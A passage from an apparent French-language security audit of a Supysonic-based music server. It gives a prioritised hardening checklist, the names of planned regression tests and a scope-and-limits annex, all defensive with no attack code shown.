- [ ] **NS-02a** — Passer `/user/del`, `/folder/del`, `/folder/scan`, `*/unlink` en POST
- [ ] **NS-05** — Liste blanche des champs dans `add_user_post` et `UserManager.add`
- [ ] **NS-08** — Borner `_dl_queue` (`maxsize=5000`)
- [ ] **NS-17/34** — `_valid_id()` en regex stricte, appliquée aux routes qui l'oublient
- [ ] **NS-28** — Refuser de démarrer avec le mot de passe admin `changeme`

### Court terme (la semaine)

- [ ] **NS-02b** — Jetons CSRF sur l'interface d'admin + contrôle `Origin`/`Sec-Fetch-Site` sur `/api`
- [ ] **NS-03** — `SUPYSONIC_SECRET_*` obligatoires en environnement, chiffrement authentifié
- [ ] **NS-06** — Filtrer les extensions dans le ZIP de dossier + restreindre le rôle
- [ ] **NS-07** — `Track.owner` + filtrage sur toutes les routes de lecture + endpoint de suppression
- [ ] **NS-09** — Sémaphore de transcodage, `timeout=` sur ffmpeg, rate-limit par utilisateur
- [ ] **NS-10** — Verrou sur le contrôle de quota
- [ ] **NS-11** — Clé de rate-limit composite IP+utilisateur, le succès ne réinitialise pas l'IP
- [ ] **NS-12** — `session.clear()` à la connexion, `session_epoch`, durée de vie réduite
- [ ] **NS-26** — `ThreadPoolExecutor` borné pour `_push_async`
- [ ] **NS-21** — Committer `package-lock.json`, `npm ci`, planchers de version

### Moyen terme

- [ ] **NS-04** — Protocole du démon en JSON, socket hors `/tmp`
- [ ] **NS-19** — Épinglage TOFU côté Android, shim restreint à l'origine, pont validé
- [ ] **NS-18** — Garde anti-SSRF sur toutes les récupérations d'URL externes
- [ ] **NS-22** — CSP restreinte aux origines réelles, HSTS
- [ ] **NS-27** — Table `AuditLog` + affichage dans l'interface d'admin
- [ ] **NS-13/14/15/16** — Durcissement de la surface Subsonic héritée

### Tests de non-régression à ajouter

```python
# tests/test_security_hardening.py
def test_session_cookie_has_samesite_and_httponly(self)   # NS-01
def test_admin_mutations_reject_get(self)                 # NS-02
def test_cross_origin_post_to_api_is_rejected(self)       # NS-02
def test_user_add_ignores_unknown_form_fields(self)       # NS-05
def test_folder_download_excludes_non_audio(self)         # NS-06
def test_guest_cannot_stream_another_users_upload(self)   # NS-07
def test_download_queue_is_bounded(self)                  # NS-08
def test_quota_holds_under_concurrent_uploads(self)       # NS-10
def test_failed_login_does_not_lock_other_users(self)     # NS-11
def test_session_invalidated_on_password_change(self)     # NS-12
def test_jsonp_callback_must_be_an_identifier(self)       # NS-15
def test_valid_id_rejects_unicode_digits(self)            # NS-17/34
```

---

## Annexe — Périmètre et limites

**Couvert :** revue manuelle intégrale de `supysonic/` (67 fichiers), `deezerpy/`,
`webapp/src/`, `android/app/src/main/`, `docker/`, `.github/workflows/`, packaging.
Vérification empirique du comportement de `Flask.config.setdefault` (Flask 3.1.3) et de
`str.isdigit()` sur les chiffres Unicode.

**Non couvert :**

* **Aucun test dynamique.** Aucune requête n'a été envoyée à une instance en fonctionnement ;
  les PoC sont dérivés de la lecture du code et doivent être confirmés en pré-production.
* Les dépendances tierces n'ont pas été auditées pour des CVE connues (pas de
  `pip-audit`/`npm audit` exécuté — pas de réseau vers les bases de vulnérabilités dans
  cet environnement).
* Pas d'analyse de la logique métier Deezer côté serveur distant, ni de revue
  cryptographique du déchiffrement Blowfish (c'est du protocole imposé, pas un choix
  du projet).
* Pas d'audit de configuration de déploiement réelle (reverse proxy, TLS, pare-feu) —
  seules les valeurs par défaut du dépôt ont été évaluées.

**Sévérités.** Attribuées selon l'impact × facilité d'exploitation dans le modèle de
menace décrit en tête, pas selon un barème CVSS formel.
